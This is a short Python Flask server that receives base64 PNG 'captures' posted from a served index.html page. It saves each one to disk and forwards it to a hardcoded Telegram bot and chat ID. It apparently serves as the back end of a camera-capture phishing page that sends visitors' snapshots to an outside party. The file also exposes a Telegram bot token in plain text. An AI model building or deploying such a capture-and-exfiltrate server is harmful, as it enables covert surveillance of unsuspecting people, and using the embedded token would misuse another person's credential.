from flask import Flask, request, jsonify, send_from_directory
import base64, re, os, requests

app = Flask(__name__)

SAVE_DIR = "captures"
os.makedirs(SAVE_DIR, exist_ok=True)

# Telegram config
BOT_TOKEN = "8332712176:AAF3Gip4RC3YLDvKJVXINvH3zGfOXC3_vt0"
CHAT_ID = "8167904992"

@app.route("/")
def index():
    return send_from_directory(".", "index.html")

@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_json()
    img_data = data.get("image", "")

    match = re.search(r"^data:image/png;base64,(.*)$", img_data)
    if not match:
        return jsonify({"status": "error", "msg": "invalid data"}), 400

    img_bytes = base64.b64decode(match.group(1))
    filename = os.path.join(SAVE_DIR, f"cap_{len(os.listdir(SAVE_DIR))}.png")
    with open(filename, "wb") as f:
        f.write(img_bytes)

    # send to Telegram
    with open(filename, "rb") as f:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {"photo": f}
        data = {"chat_id": CHAT_ID, "caption": "New capture received 📸"}
        requests.post(url, data=data, files=files)

    return jsonify({"status": "ok", "saved": filename})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Railway se PORT le lo, default 5000
    app.run(host="0.0.0.0", port=port)